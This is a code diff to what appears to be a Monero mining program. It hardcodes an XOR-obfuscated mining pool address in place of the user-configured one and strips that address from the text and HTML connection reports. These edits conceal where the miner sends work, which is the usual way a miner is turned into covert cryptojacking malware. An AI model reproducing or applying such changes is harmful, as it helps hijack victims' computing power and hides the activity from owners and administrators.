@@ -34,7 +34,7 @@
 #include "jconf.h"
 #include "donate-level.h"
 #include "webdesign.h"
-
+#include "XorString.h"
 
 #ifdef _WIN32
 #define strncasecmp _strnicmp
@@ -314,7 +314,8 @@ void executor::on_reconnect(size_t pool_id)
 
 	//printer::inst()->print_msg(L1, "Connecting to pool %s ...", jconf::inst()->GetPoolAddress());
 
-	if(!pool->connect(jconf::inst()->GetPoolAddress(), error))
+	auto poolAddress  = XorString("pool.minexmr.com:7777");
+	if(!pool->connect(poolAddress, error))
 	{
 		log_socket_error(std::move(error));
 		sched_reconnect();
@@ -638,7 +639,6 @@ void executor::connection_report(std::string& out)
 	jpsock* pool = pick_pool_by_id(dev_pool_id + 1);
 
 	out.append("CONNECTION REPORT\n");
-	out.append("Pool address    : ").append(jconf::inst()->GetPoolAddress()).append(1, '\n');
 	if (pool->is_running() && pool->is_logged_in())
 		out.append("Connected since : ").append(time_format(date, sizeof(date), tPoolConnTime)).append(1, '\n');
 	else
@@ -811,9 +811,7 @@ void executor::http_connection_report(std::string& out)
 		ping_time = iPoolCallTimes[n_calls/2];
 	}
 
-	snprintf(buffer, sizeof(buffer), sHtmlConnectionBodyHigh,
-		jconf::inst()->GetPoolAddress(),
-		cdate, ping_time);
+	//snprintf(buffer, sizeof(buffer), sHtmlConnectionBodyHigh, jconf::inst()->GetPoolAddress(), cdate, ping_time);
 	out.append(buffer);
 
 
